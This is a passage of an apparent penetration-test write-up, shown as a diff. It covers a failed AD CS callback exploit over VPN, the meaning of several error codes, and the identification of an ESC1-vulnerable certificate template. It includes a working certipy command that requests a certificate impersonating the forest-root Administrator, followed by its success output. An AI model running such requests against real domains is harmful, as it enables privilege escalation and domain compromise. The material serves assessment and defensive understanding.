@@ -1,0 +1,52 @@
+<pre><code class="language-text">203.0.113.25/32    VPN address: outbound access worked, inbound callback did not
+198.51.100.25      Office address: no CA callback reached ports 389 or 445</code></pre>
+<p>Adding a local firewall rule did not change the result because the packets never arrived. The remaining options would have been to run the PoC from an internal Linux system, use an authorised internal forwarding point capable of receiving connections on ports <code>389</code> and <code>445</code>, or temporarily permit the specific CA-to-assessment-host flows. None was available within the assessment setup.</p>
+<p>At this point, repeated attempts would only have created additional failed CA requests. The technical blocker was understood, and the assessment moved back to certificate template enumeration.</p>
+<h2>Error Interpretation</h2>
+<p><code>ept_s_not_registered</code> meant the certificate RPC interface was not available at the endpoint selected by the PoC. In this case, the request had been sent to a DC instead of the CA.</p>
+<p><code>0x80094012</code> meant the CA policy module denied enrolment. In this case, the requesting computer belonged to the child domain while the template permitted the forest-root <code>Domain Computers</code> group.</p>
+<p><code>0x800706ba</code> meant the request entered the callback-dependent processing path but the CA could not complete the callback. In this case, neither the VPN address nor the office address was reachable from the CA on the rogue service ports.</p>
+<p>None of these errors independently proved that the CA was patched. Each described a different failed prerequisite around endpoint selection, authorisation or network reachability.</p>
+<h2>AD CS Certificate Template Security</h2>
+<p>Active Directory Certificate Services uses certificate templates to define who may enrol, how the subject identity is constructed, which approval steps apply, and what the resulting certificate can be used for. A certificate intended only for a web server should normally be restricted to the relevant systems and should not unintentionally provide a general-purpose client authentication identity.</p>
+<p>The Extended Key Usage values are particularly important. A certificate that permits client authentication may be accepted for authentication to Active Directory. If the requester can also control the subject or Subject Alternative Name, the certificate can potentially be issued for a different user or computer identity.</p>
+<p>ESC1 describes a dangerous combination in which a low-privileged principal can enrol in an authentication-capable template and supply the identity placed in the certificate, without protective approval or signature requirements. The issue is a configuration weakness rather than a software vulnerability, and it remains exploitable even when the CA operating system is fully patched.</p>
+<p>The relevant conditions can be summarised as follows:</p>
+<pre><code class="language-text">The template is enabled on a CA
+A low-privileged principal has enrolment rights
+The enrollee can supply the subject or alternative identity
+The certificate supports client authentication or an equivalent authentication purpose
+Manager approval is not required
+No authorised signatures are required</code></pre>
+<h2>ESC1 Certificate Template Identification</h2>
+<p>Template enumeration identified an anonymised template referred to here as <code>LegacyWebTLS</code>. It appeared to have been created for server certificates, but its configuration also permitted client authentication.</p>
+<pre><code class="language-text">Template: LegacyWebTLS
+Enabled: True
+Client Authentication: True
+Server Authentication: True
+Enrollee Supplies Subject: True
+Requires Manager Approval: False
+Authorised Signatures Required: 0
+Enrolment Rights: Authenticated Users</code></pre>
+<p>This template did not contain the DNS name flags required by the CertiGhost PoC, so changing the PoC's <code>--template</code> value to <code>LegacyWebTLS</code> would not have solved the callback problem. It was nevertheless directly vulnerable to ESC1.</p>
+<p>The distinction was important. The <code>Machine</code> template had the behaviour CertiGhost needed but initially denied the requesting principal. <code>LegacyWebTLS</code> granted the requesting principal enrolment rights and allowed identity control but did not trigger CertiGhost. They represented different attack paths despite both being AD CS templates.</p>
+<h2>ESC1 Network Requirements</h2>
+<p>The ESC1 route used a normal certificate request from the assessment host to the CA. It did not require the CA, a domain controller or another server to initiate a connection back to Kali.</p>
+<pre><code class="language-text">CertiGhost: attacker -&gt; CA request, then CA -&gt; attacker callback
+ESC8 relay: victim -&gt; attacker authentication, then attacker -&gt; web enrolment
+ESC1: attacker -&gt; CA request only</code></pre>
+<p>The assessment host already had permission to connect to the CA's certificate RPC interface. The low-privileged account was included in the template's effective enrolment rights. Consequently, the office and VPN restrictions that blocked CertiGhost and would also have complicated conventional ESC8 relay did not prevent ESC1.</p>
+<h2>Privileged Certificate Request</h2>
+<p>The successful request used fictional values in the example below. The requester authenticated as a low-privileged child-domain user but asked the vulnerable template to include the forest-root Administrator UPN and SID.</p>
+<pre><code class="language-bash">CERTIPY=$(command -v certipy-ad || command -v certipy); &quot;$CERTIPY&quot; req -u &#x27;audit.user@child.example&#x27; -p &quot;$USER_PASS&quot; -dc-ip 192.0.2.10 -target &#x27;CA01.corp.example&#x27; -target-ip 192.0.2.30 -ca &#x27;CORP-CA&#x27; -template &#x27;LegacyWebTLS&#x27; -upn &#x27;administrator@corp.example&#x27; -sid &#x27;S-1-5-21-1111111111-2222222222-3333333333-500&#x27; -out &#x27;administrator_corp.pfx&#x27; -debug</code></pre>
+<p>The CA accepted the request and returned a certificate containing the requested privileged identity:</p>
+<pre><code class="language-text">[*] Requesting certificate via RPC
+[+] Connected to endpoint: ncacn_np:192.0.2.30[\pipe\cert]
+[*] Request ID is &lt;REDACTED&gt;
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#x27;administrator@corp.example&#x27;
+[+] Found SID in SAN URL: &#x27;S-1-5-21-1111111111-2222222222-3333333333-500&#x27;
+[*] Certificate object SID is &#x27;S-1-5-21-1111111111-2222222222-3333333333-500&#x27;
+[*] Wrote certificate and private key to &#x27;administrator_corp.pfx&#x27;</code></pre>
+<p>The SID was important in environments enforcing stronger certificate mappings. Rather than relying only on a matching UPN, the issued certificate contained identity data that mapped it to the targeted directory object.</p>
+<h2>Certificate-Based Kerberos Authentication</h2>
